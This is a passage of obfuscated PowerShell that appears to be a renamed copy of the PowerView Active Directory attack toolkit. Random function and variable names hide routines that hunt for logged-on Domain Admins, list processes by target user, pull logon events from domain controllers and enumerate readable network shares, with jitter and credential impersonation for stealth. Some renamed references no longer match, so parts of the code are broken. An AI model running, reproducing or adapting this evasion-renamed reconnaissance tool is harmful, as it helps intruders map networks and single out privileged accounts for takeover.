                                $BBoeZNOp99 | Add-Member Noteproperty 'ComputerName' $LzaREudW99
                                $BBoeZNOp99 | Add-Member Noteproperty 'SessionFrom' $CName
                                try {
                                    $xzuExgqX99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $BBoeZNOp99 | Add-Member NoteProperty 'SessionFromName' $xzuExgqX99
                                }
                                catch {
                                    $BBoeZNOp99 | Add-Member NoteProperty 'SessionFromName' $Null
                                }
                                if ($xWWRvjWJ99) {
                                    $Admin = (portent -lgkTdAeF99 $CName).IsAdmin
                                    $BBoeZNOp99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $BBoeZNOp99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $BBoeZNOp99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $BBoeZNOp99
                            }
                        }
                    }
                    if (-not $MRlFgLNB99) {
                        $FJiCdsSg99 = silvan -lgkTdAeF99 $LzaREudW99
                        ForEach ($User in $FJiCdsSg99) {
                            $QuaUtxHk99 = $User.UserName
                            $qgzVOkSs99 = $User.LogonDomain
                            if (($QuaUtxHk99) -and ($QuaUtxHk99.trim() -ne '')) {
                                if ( (-not $nImnTSFZ99) -or ($nImnTSFZ99 -contains $QuaUtxHk99) -and ($QuaUtxHk99 -notmatch '\$$')) {
                                    $YvEStgCe99 = @(prioritize -lgkTdAeF99 $LzaREudW99)[0].IPAddress
                                    $BBoeZNOp99 = New-Object PSObject
                                    $BBoeZNOp99 | Add-Member Noteproperty 'UserDomain' $qgzVOkSs99
                                    $BBoeZNOp99 | Add-Member Noteproperty 'UserName' $QuaUtxHk99
                                    $BBoeZNOp99 | Add-Member Noteproperty 'ComputerName' $LzaREudW99
                                    $BBoeZNOp99 | Add-Member Noteproperty 'IPAddress' $YvEStgCe99
                                    $BBoeZNOp99 | Add-Member Noteproperty 'SessionFrom' $Null
                                    $BBoeZNOp99 | Add-Member Noteproperty 'SessionFromName' $Null
                                    if ($xWWRvjWJ99) {
                                        $Admin = portent -lgkTdAeF99 $LzaREudW99
                                        $BBoeZNOp99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $BBoeZNOp99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $BBoeZNOp99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $BBoeZNOp99
                                }
                            }
                        }
                    }
                }
            }
            if ($hChekWvA99) {
                flake
            }
        }
        $sufTyDkO99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
            }
            else {
                $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[labyrinths] Total number of hosts: $($QDUcaCgD99.count)"
            Write-Verbose "[labyrinths] Delay: $Delay, Jitter: $tlkgnzQk99"
            $zicWLoHX99 = 0
            $VPQqJKGJ99 = New-Object System.Random
            ForEach ($LzaREudW99 in $QDUcaCgD99) {
                $zicWLoHX99 = $zicWLoHX99 + 1
                Start-Sleep -Seconds $VPQqJKGJ99.Next((1-$tlkgnzQk99)*$Delay, (1+$tlkgnzQk99)*$Delay)
                Write-Verbose "[labyrinths] Enumerating server $zNIilCKh99 ($zicWLoHX99 of $($QDUcaCgD99.Count))"
                Invoke-Command -bcFYSNuu99 $bxgZLetd99 -ArgumentList $LzaREudW99, $nImnTSFZ99, $YhJEgkCE99, $MRlFgLNB99, $sufTyDkO99
                if ($XUqUetvM99 -and $ebFmufYv99) {
                    Write-Verbose "[labyrinths] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[labyrinths] Using threading with threads: $LNieHbVi99"
            Write-Verbose "[labyrinths] TargetComputers length: $($QDUcaCgD99.Length)"
            $rhNTqhgu99 = @{
                'TargetUsers' = $nImnTSFZ99
                'CurrentUser' = $YhJEgkCE99
                'Stealth' = $MRlFgLNB99
                'TokenHandle' = $sufTyDkO99
            }
            debase -lgkTdAeF99 $QDUcaCgD99 -bcFYSNuu99 $bxgZLetd99 -HqqhpecG99 $rhNTqhgu99 -LNieHbVi99 $LNieHbVi99
        }
    }
    END {
        if ($sufTyDkO99) {
            flake -hChekWvA99 $sufTyDkO99
        }
    }
}
function vivifying {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $lgkTdAeF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cIQhKeSL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $DadXoedG99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jPqTmeSS99,
        [Alias('Unconstrained')]
        [Switch]
        $PCjjFzqw99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $PhGukTEa99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $HNBlKzGX99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GZGGRJzb99,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $sHcrUXwy99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PndMyEmp99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $qgzVOkSs99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $TYbeeSHd99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $MKwNKJfU99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $WwQIimAb99 = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $ZcyVoWad99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $ebFmufYv99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $tlkgnzQk99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $LNieHbVi99 = 20
    )
    BEGIN {
        $rsKAQUCp99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $rsKAQUCp99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['ComputerDomain']) { $rsKAQUCp99['Domain'] = $cIQhKeSL99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rsKAQUCp99['LDAPFilter'] = $DadXoedG99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rsKAQUCp99['SearchBase'] = $jPqTmeSS99 }
        if ($PSBoundParameters['Unconstrained']) { $rsKAQUCp99['Unconstrained'] = $tdRSmHCF99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rsKAQUCp99['OperatingSystem'] = $fNLjzEnS99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rsKAQUCp99['ServicePack'] = $OUZDyVMQ99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rsKAQUCp99['SiteName'] = $ixDINSpI99 }
        if ($PSBoundParameters['Server']) { $rsKAQUCp99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $rsKAQUCp99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $rsKAQUCp99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rsKAQUCp99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $rsKAQUCp99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $rsKAQUCp99['Credential'] = $xjRyyQze99 }
        $UYMYjrtp99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UYMYjrtp99['Identity'] = $PndMyEmp99 }
        if ($PSBoundParameters['Domain']) { $UYMYjrtp99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['UserDomain']) { $UYMYjrtp99['Domain'] = $qgzVOkSs99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $UYMYjrtp99['LDAPFilter'] = $TYbeeSHd99 }
        if ($PSBoundParameters['UserSearchBase']) { $UYMYjrtp99['SearchBase'] = $MKwNKJfU99 }
        if ($PSBoundParameters['UserAdminCount']) { $UYMYjrtp99['AdminCount'] = $ZcyVoWad99 }
        if ($PSBoundParameters['Server']) { $UYMYjrtp99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $UYMYjrtp99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $UYMYjrtp99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $UYMYjrtp99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $UYMYjrtp99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $UYMYjrtp99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['ComputerName']) {
            $QDUcaCgD99 = $lgkTdAeF99
        }
        else {
            Write-Verbose '[vivifying] Querying computers in the domain'
            $QDUcaCgD99 = pickerels @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[vivifying] TargetComputers length: $($QDUcaCgD99.Length)"
        if ($QDUcaCgD99.Length -eq 0) {
            throw '[vivifying] No hosts found to enumerate'
        }
        if ($PSBoundParameters['ProcessName']) {
            $YRgjPlXG99 = @()
            ForEach ($T in $sHcrUXwy99) {
                $YRgjPlXG99 += $T.Split(',')
            }
            if ($YRgjPlXG99 -isnot [System.Array]) {
                $YRgjPlXG99 = [String[]] @($YRgjPlXG99)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $nImnTSFZ99 = wasteland @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $Xycmjcai99 = @{
                'Identity' = $WwQIimAb99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $Xycmjcai99['Domain'] = $qgzVOkSs99 }
            if ($PSBoundParameters['UserSearchBase']) { $Xycmjcai99['SearchBase'] = $MKwNKJfU99 }
            if ($PSBoundParameters['Server']) { $Xycmjcai99['Server'] = $GejzMkbd99 }
            if ($PSBoundParameters['SearchScope']) { $Xycmjcai99['SearchScope'] = $yuycROvu99 }
            if ($PSBoundParameters['ResultPageSize']) { $Xycmjcai99['ResultPageSize'] = $vUSyLBJJ99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $Xycmjcai99['ServerTimeLimit'] = $cNGaYdSy99 }
            if ($PSBoundParameters['Tombstone']) { $Xycmjcai99['Tombstone'] = $kQTByXSX99 }
            if ($PSBoundParameters['Credential']) { $Xycmjcai99['Credential'] = $xjRyyQze99 }
            $Xycmjcai99
            $nImnTSFZ99 = Twitter @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        $bxgZLetd99 = {
            Param($lgkTdAeF99, $sHcrUXwy99, $nImnTSFZ99, $xjRyyQze99)
            ForEach ($LzaREudW99 in $lgkTdAeF99) {
                $Up = Test-Connection -Count 1 -Quiet -lgkTdAeF99 $LzaREudW99
                if ($Up) {
                    if ($xjRyyQze99) {
                        $iSFVHuMc99 = quadriplegics -xjRyyQze99 $xjRyyQze99 -lgkTdAeF99 $LzaREudW99 -ErrorAction SilentlyContinue
                    }
                    else {
                        $iSFVHuMc99 = quadriplegics -lgkTdAeF99 $LzaREudW99 -ErrorAction SilentlyContinue
                    }
                    ForEach ($cqLUEqgz99 in $iSFVHuMc99) {
                        if ($sHcrUXwy99) {
                            if ($sHcrUXwy99 -Contains $cqLUEqgz99.ProcessName) {
                                $cqLUEqgz99
                            }
                        }
                        elseif ($nImnTSFZ99 -Contains $cqLUEqgz99.User) {
                            $cqLUEqgz99
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[vivifying] Total number of hosts: $($QDUcaCgD99.count)"
            Write-Verbose "[vivifying] Delay: $Delay, Jitter: $tlkgnzQk99"
            $zicWLoHX99 = 0
            $VPQqJKGJ99 = New-Object System.Random
            ForEach ($LzaREudW99 in $QDUcaCgD99) {
                $zicWLoHX99 = $zicWLoHX99 + 1
                Start-Sleep -Seconds $VPQqJKGJ99.Next((1-$tlkgnzQk99)*$Delay, (1+$tlkgnzQk99)*$Delay)
                Write-Verbose "[vivifying] Enumerating server $LzaREudW99 ($zicWLoHX99 of $($QDUcaCgD99.count))"
                $XUqUetvM99 = Invoke-Command -bcFYSNuu99 $bxgZLetd99 -ArgumentList $LzaREudW99, $YRgjPlXG99, $nImnTSFZ99, $xjRyyQze99
                $XUqUetvM99
                if ($XUqUetvM99 -and $ebFmufYv99) {
                    Write-Verbose "[vivifying] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[vivifying] Using threading with threads: $LNieHbVi99"
            $rhNTqhgu99 = @{
                'ProcessName' = $YRgjPlXG99
                'TargetUsers' = $nImnTSFZ99
                'Credential' = $xjRyyQze99
            }
            debase -lgkTdAeF99 $QDUcaCgD99 -bcFYSNuu99 $bxgZLetd99 -HqqhpecG99 $rhNTqhgu99 -LNieHbVi99 $LNieHbVi99
        }
    }
}
function bootlegger {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99,
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $tGcqvLrx99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $MDWNJDQX99 = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $AZxmvbdC99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $rExYsMZe99 = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PndMyEmp99,
        [ValidateNotNullOrEmpty()]
        [String]
        $qgzVOkSs99,
        [ValidateNotNullOrEmpty()]
        [String]
        $TYbeeSHd99,
        [ValidateNotNullOrEmpty()]
        [String]
        $MKwNKJfU99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $WwQIimAb99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $ZcyVoWad99,
        [Switch]
        $xWWRvjWJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $ebFmufYv99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $tlkgnzQk99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $LNieHbVi99 = 20
    )
    BEGIN {
        $UYMYjrtp99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UYMYjrtp99['Identity'] = $PndMyEmp99 }
        if ($PSBoundParameters['UserDomain']) { $UYMYjrtp99['Domain'] = $qgzVOkSs99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $UYMYjrtp99['LDAPFilter'] = $TYbeeSHd99 }
        if ($PSBoundParameters['UserSearchBase']) { $UYMYjrtp99['SearchBase'] = $MKwNKJfU99 }
        if ($PSBoundParameters['UserAdminCount']) { $UYMYjrtp99['AdminCount'] = $ZcyVoWad99 }
        if ($PSBoundParameters['Server']) { $UYMYjrtp99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $UYMYjrtp99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $UYMYjrtp99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $UYMYjrtp99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $UYMYjrtp99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $UYMYjrtp99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $nImnTSFZ99 = wasteland @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            $Xycmjcai99 = @{
                'Identity' = $WwQIimAb99
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $WwQIimAb99"
            if ($PSBoundParameters['UserDomain']) { $Xycmjcai99['Domain'] = $qgzVOkSs99 }
            if ($PSBoundParameters['UserSearchBase']) { $Xycmjcai99['SearchBase'] = $MKwNKJfU99 }
            if ($PSBoundParameters['Server']) { $Xycmjcai99['Server'] = $GejzMkbd99 }
            if ($PSBoundParameters['SearchScope']) { $Xycmjcai99['SearchScope'] = $yuycROvu99 }
            if ($PSBoundParameters['ResultPageSize']) { $Xycmjcai99['ResultPageSize'] = $vUSyLBJJ99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $Xycmjcai99['ServerTimeLimit'] = $cNGaYdSy99 }
            if ($PSBoundParameters['Tombstone']) { $Xycmjcai99['Tombstone'] = $kQTByXSX99 }
            if ($PSBoundParameters['Credential']) { $Xycmjcai99['Credential'] = $xjRyyQze99 }
            $nImnTSFZ99 = Twitter @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        if ($PSBoundParameters['ComputerName']) {
            $QDUcaCgD99 = $lgkTdAeF99
        }
        else {
            $BfFSnkzU99 = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $BfFSnkzU99['Domain'] = $gddrYpaX99 }
            if ($PSBoundParameters['Server']) { $BfFSnkzU99['Server'] = $GejzMkbd99 }
            if ($PSBoundParameters['Credential']) { $BfFSnkzU99['Credential'] = $xjRyyQze99 }
            Write-Verbose "[bootlegger] Querying for domain controllers in domain: $gddrYpaX99"
            $QDUcaCgD99 = numbed @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($QDUcaCgD99 -and ($QDUcaCgD99 -isnot [System.Array])) {
            $QDUcaCgD99 = @(,$QDUcaCgD99)
        }
        Write-Verbose "[bootlegger] TargetComputers length: $($QDUcaCgD99.Length)"
        Write-Verbose "[bootlegger] TargetComputers $QDUcaCgD99"
        if ($QDUcaCgD99.Length -eq 0) {
            throw '[bootlegger] No hosts found to enumerate'
        }
        $bxgZLetd99 = {
            Param($lgkTdAeF99, $MDWNJDQX99, $AZxmvbdC99, $rExYsMZe99, $nImnTSFZ99, $tGcqvLrx99, $xjRyyQze99)
            ForEach ($LzaREudW99 in $lgkTdAeF99) {
                $Up = Test-Connection -Count 1 -Quiet -lgkTdAeF99 $LzaREudW99
                if ($Up) {
                    $jxstgVOK99 = @{
                        'ComputerName' = $LzaREudW99
                    }
                    if ($MDWNJDQX99) { $jxstgVOK99['StartTime'] = $MDWNJDQX99 }
                    if ($AZxmvbdC99) { $jxstgVOK99['EndTime'] = $AZxmvbdC99 }
                    if ($rExYsMZe99) { $jxstgVOK99['MaxEvents'] = $rExYsMZe99 }
                    if ($xjRyyQze99) { $jxstgVOK99['Credential'] = $xjRyyQze99 }
                    if ($tGcqvLrx99 -or $nImnTSFZ99) {
                        if ($nImnTSFZ99) {
                            zephyr @DomainUserEventArgs | Where-Object {$nImnTSFZ99 -contains $_.TargetUserName}
                        }
                        else {
                            $IZnisMNO99 = 'or'
                            $tGcqvLrx99.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($tGcqvLrx99[$_] -match '&') -or ($tGcqvLrx99[$_] -eq 'and')) {
                                        $IZnisMNO99 = 'and'
                                    }
                                }
                            }
                            $Keys = $tGcqvLrx99.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            zephyr @DomainUserEventArgs | ForEach-Object {
                                if ($IZnisMNO99 -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $tGcqvLrx99[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $tGcqvLrx99[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        zephyr @DomainUserEventArgs
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[bootlegger] Total number of hosts: $($QDUcaCgD99.count)"
            Write-Verbose "[bootlegger] Delay: $Delay, Jitter: $tlkgnzQk99"
            $zicWLoHX99 = 0
            $VPQqJKGJ99 = New-Object System.Random
            ForEach ($LzaREudW99 in $QDUcaCgD99) {
                $zicWLoHX99 = $zicWLoHX99 + 1
                Start-Sleep -Seconds $VPQqJKGJ99.Next((1-$tlkgnzQk99)*$Delay, (1+$tlkgnzQk99)*$Delay)
                Write-Verbose "[bootlegger] Enumerating server $LzaREudW99 ($zicWLoHX99 of $($QDUcaCgD99.count))"
                $XUqUetvM99 = Invoke-Command -bcFYSNuu99 $bxgZLetd99 -ArgumentList $LzaREudW99, $MDWNJDQX99, $AZxmvbdC99, $rExYsMZe99, $nImnTSFZ99, $tGcqvLrx99, $xjRyyQze99
                $XUqUetvM99
                if ($XUqUetvM99 -and $ebFmufYv99) {
                    Write-Verbose "[bootlegger] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[bootlegger] Using threading with threads: $LNieHbVi99"
            $rhNTqhgu99 = @{
                'StartTime' = $MDWNJDQX99
                'EndTime' = $AZxmvbdC99
                'MaxEvents' = $rExYsMZe99
                'TargetUsers' = $nImnTSFZ99
                'Filter' = $tGcqvLrx99
                'Credential' = $xjRyyQze99
            }
            debase -lgkTdAeF99 $QDUcaCgD99 -bcFYSNuu99 $bxgZLetd99 -HqqhpecG99 $rhNTqhgu99 -LNieHbVi99 $LNieHbVi99
        }
    }
}
function compact {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $lgkTdAeF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $cIQhKeSL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $DadXoedG99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jPqTmeSS99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $PhGukTEa99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $HNBlKzGX99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GZGGRJzb99,
        [Alias('CheckAccess')]
        [Switch]
        $LbPxpcfl99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $tlkgnzQk99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $LNieHbVi99 = 20
    )
    BEGIN {
        $rsKAQUCp99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $rsKAQUCp99['Domain'] = $cIQhKeSL99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rsKAQUCp99['LDAPFilter'] = $DadXoedG99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rsKAQUCp99['SearchBase'] = $jPqTmeSS99 }
        if ($PSBoundParameters['Unconstrained']) { $rsKAQUCp99['Unconstrained'] = $tdRSmHCF99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rsKAQUCp99['OperatingSystem'] = $fNLjzEnS99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rsKAQUCp99['ServicePack'] = $OUZDyVMQ99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rsKAQUCp99['SiteName'] = $ixDINSpI99 }
        if ($PSBoundParameters['Server']) { $rsKAQUCp99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $rsKAQUCp99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $rsKAQUCp99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rsKAQUCp99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $rsKAQUCp99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $rsKAQUCp99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['ComputerName']) {
            $QDUcaCgD99 = $lgkTdAeF99
        }
        else {
            Write-Verbose '[compact] Querying computers in the domain'
            $QDUcaCgD99 = pickerels @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[compact] TargetComputers length: $($QDUcaCgD99.Length)"
        if ($QDUcaCgD99.Length -eq 0) {
            throw '[compact] No hosts found to enumerate'
        }
        $bxgZLetd99 = {
            Param($lgkTdAeF99, $LbPxpcfl99, $hChekWvA99)
            if ($hChekWvA99) {
                $Null = properest -hChekWvA99 $hChekWvA99 -Quiet
            }
            ForEach ($LzaREudW99 in $lgkTdAeF99) {
                $Up = Test-Connection -Count 1 -Quiet -lgkTdAeF99 $LzaREudW99
                if ($Up) {
                    $rSEXBMoV99 = overstatement -lgkTdAeF99 $LzaREudW99
                    ForEach ($Share in $rSEXBMoV99) {
                        $HsbkIJLD99 = $Share.Name
                        $Path = '\\'+$LzaREudW99+'\'+$HsbkIJLD99
                        if (($HsbkIJLD99) -and ($HsbkIJLD99.trim() -ne '')) {
                            if ($LbPxpcfl99) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }
            if ($hChekWvA99) {
                flake
            }
        }
        $sufTyDkO99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $sufTyDkO99 = properest -xjRyyQze99 $xjRyyQze99
            }
            else {
